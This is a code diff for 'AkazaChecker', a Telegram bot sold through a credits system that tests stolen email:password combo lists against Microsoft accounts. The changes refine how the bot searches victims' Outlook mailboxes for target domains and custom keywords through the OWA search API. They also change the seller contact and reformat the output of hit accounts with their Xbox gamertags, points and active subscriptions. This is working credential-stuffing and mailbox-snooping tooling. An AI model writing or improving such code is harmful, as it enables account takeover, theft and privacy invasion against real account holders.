@@ -788,10 +788,13 @@ class AkazaChecker:
         except: pass
 
         # 2. Sequential search for better reliability
-        combined = list(dict.fromkeys(list(TARGET_DOMAINS.keys()) + (u_kws or [])))
-        # Search in batches to avoid query limits
-        for i in range(0, len(combined), 10):
-            batch = combined[i:i+10]
+        # We check built-in domains in batches for speed, 
+        # but check USER keywords individually (hit.py style) for maximum accuracy.
+        
+        # 2a. Built-in TARGET_DOMAINS
+        domains = list(TARGET_DOMAINS.keys())
+        for i in range(0, len(domains), 10):
+            batch = domains[i:i+10]
             q = ' OR '.join([f'"{k}"' for k in batch])
             payload = {
                 "Cvid": str(uuid.uuid4()),
@@ -807,16 +810,32 @@ class AkazaChecker:
                 rset = r.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0]
                 if rset.get('Total', 0) > 0:
                     for item in rset.get('Results', []):
-                        # Extract sender and combine with subject/preview for thorough scanning
                         frm = item.get('From', {}).get('EmailAddress', {})
                         sender = (frm.get('Address', '') + ' ' + frm.get('Name', '')).lower()
                         content = (item.get('Subject', '') + ' ' + item.get('Preview', '') + ' ' + sender).lower()
-                        
                         for k in batch:
                             if k.lower() in content:
                                 name = TARGET_DOMAINS.get(k, k)
                                 res['hits'][name] = res['hits'].get(name, 0) + 1
             except: pass
+
+        # 2b. User CUSTOM Keywords (hit.py style - individual search)
+        if u_kws:
+            for kw in u_kws:
+                q = f'"{kw}"'
+                if "@" in kw or "." in kw: q = f'from:"{kw}" OR "{kw}"'
+                payload = {
+                    "Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"},
+                    "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Query": {"QueryString": q}, "Size": 10}]
+                }
+                try:
+                    r = self.session.post("https://outlook.live.com/search/api/v2/query",
+                                          json=payload, headers=h, timeout=10, verify=False).json()
+                    rset = r.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0]
+                    total = rset.get('Total', 0)
+                    if total > 0:
+                        res['hits'][kw] = res['hits'].get(kw, 0) + total
+                except: pass
         return res
 
     # ── MAIN CHECK ORCHESTRATOR ────────────────────────────────────────────
@@ -960,7 +979,7 @@ async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
            f"💰 <b>Credits:</b> <code>{i['credits']}</code>\n"
            f"⚙️ <b>Threads:</b> <code>{s['threads']}</code>\n"
            f"🔑 <b>Keywords:</b> <code>{len(s['keywords'])}</code>\n\n"
-           f"🛒 <i>To buy credits, contact @Akaza_Admin</i>")
+           f"🛒 <i>To buy credits, contact @Akaza_isnt</i>")
     
     kbd = [[InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
            [InlineKeyboardButton("🔍 Keywords", callback_data="kw_mode"), InlineKeyboardButton("🌐 Proxy", callback_data="proxy")],
@@ -1009,7 +1028,7 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
 
     user_credits = akaza_db.get_credits(uid)
     if user_credits < len(lines) and uid != ADMIN_ID:
-        await (u.callback_query.message.reply_text(f"⚠️ <b>Insufficient Credits!</b>\nYou need <code>{len(lines)}</code> but have <code>{user_credits}</code>.\n🛒 Contact @Akaza_Admin to buy credits.", parse_mode="HTML") if u.callback_query else u.message.reply_text(f"⚠️ <b>Insufficient Credits!</b>\nYou need <code>{len(lines)}</code> but have <code>{user_credits}</code>.\n🛒 Contact @Akaza_Admin to buy credits.", parse_mode="HTML"))
+        await (u.callback_query.message.reply_text(f"⚠️ <b>Insufficient Credits!</b>\nYou need <code>{len(lines)}</code> but have <code>{user_credits}</code>.\n🛒 Contact @Akaza_isnt to buy credits.", parse_mode="HTML") if u.callback_query else u.message.reply_text(f"⚠️ <b>Insufficient Credits!</b>\nYou need <code>{len(lines)}</code> but have <code>{user_credits}</code>.\n🛒 Contact @Akaza_isnt to buy credits.", parse_mode="HTML"))
         return
 
     s = akaza_db.get_user_settings(uid)
@@ -1054,12 +1073,12 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                 all_hits_results.append(f"{email}:{password} | Pts:{pts} | GT:{xbox.get('gt','N/A')} | {country}")
                 if pts > 0: points_results.append(f"{email}:{password} | {pts} Pts")
 
-                # Microsoft Specialized Hits (Points, Subs, or Xbox)
-                has_subs = any(not su.get('is_expired') for su in data.get('subs', {}).get('subs', []))
-                if pts > 0 or has_subs or xbox.get('gt') != 'N/A':
-                    info = f"{email}:{password} | Pts:{pts}"
-                    if has_subs: info += " | [Has Subs]"
+                # Microsoft Specialized Hits (Subs or Xbox - No redundant Points)
+                active_subs = [su['name'] for su in data.get('subs', {}).get('subs', []) if not su.get('is_expired')]
+                if active_subs or xbox.get('gt') != 'N/A':
+                    info = f"{email}:{password}"
                     if xbox.get('gt') != 'N/A': info += f" | GT:{xbox.get('gt')}"
+                    if active_subs: info += f" | Subs: {', '.join(active_subs)}"
                     ms_hits_results.append(info)
 
                 # Minecraft
